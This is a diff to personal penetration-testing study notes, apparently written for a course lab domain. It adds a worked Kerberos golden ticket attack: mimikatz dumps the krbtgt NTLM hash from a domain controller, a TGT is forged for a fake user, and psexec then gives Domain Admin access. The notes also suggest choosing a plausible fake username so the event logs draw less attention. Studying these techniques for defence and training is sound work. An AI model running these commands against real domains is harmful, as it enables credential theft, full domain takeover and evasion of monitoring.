@@ -1996,7 +1996,7 @@ TODO the reason
       + The *TGT* will be valid for 10 hours by default, after that a renewal occurs. "This renewal does not require the user to re-enter the password."
     
     - the *krbtgt* account's *hmac* only changes in rare cases (in some enterprises "the pw hasn't changed in years")
-      + upgrade of domain functional level
+      + upgrade of domain functional level from 2003 to any higher level('08, '08R2, '12, '12R2) *due to the introduction of AES hashes*.
       + direct recovery
       + manually changed (compromise recovery)
     - the ticket is ASN.1 encoded? tool::OpenSSL
@@ -2402,10 +2402,44 @@ End Sub
       ## do Overpass the Hash, convert NTLM hash to (TGT + TGS)
       ## reuse the TGT to login to the DC.
     psexec.exe \\dc01 cmd.exe
-      ## Assume the login complete.
+      ## Assume the login to the DC complete.
     #+end_src
-    // p672
+    #+begin_src powershell
+    mimikatz # privilege:: debug
+      ## Privilege '20' OK
+    mimikatz # lsadump::lsa /patch
+      ## Domain : CORP / S-1-5-21-1602875587-2787523311-2599479668 
+      ## ...
+      ## RID : 000001f6 (502)
+      ## User : krbtgt
+      ## LM :
+      ## NTLM : 75b60230a2394a812000dbfad8415965 
+    #+end_src
+      - the lsadump::lsa /patch seems to operate by patching something and dump the pw hash.
 
+    #+begin_src powershell
+    ## with the krbtgt NTLM hash, domain and the domain sid, a golden ticket could be generated anywhere.
+    mimikatz # kerberos::purge
+      ## purge existing krb tickets
+    mimikatz # kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
+
+    ## login possible with the fake TGT generated
+    psexec.exe \\dc01 cmd.exe
+    whoami
+      ## corp\fakeuser
+    whoami /groups
+      ## CORP\Domain Admins
+    #+end_src
+      - fake a reasonable username, since that might be shown on the event log.
+    
+    #+begin_quote
+    Note that by creating our own TGT and then using PsExec, we are performing the overpass the hash attack by leveraging Kerberos authentication. 
+    #+end_quote
+      - trying to connect with the ip of a DC would force the use of NTLM. As a result, the access would be blocked.
+    #+begin_src powershell
+    psexec.exe \\192.168.1.110 cmd.exe
+      ## Access is denied. 
+    #+end_src
 
 * TODO list
   + nmap: quick, full
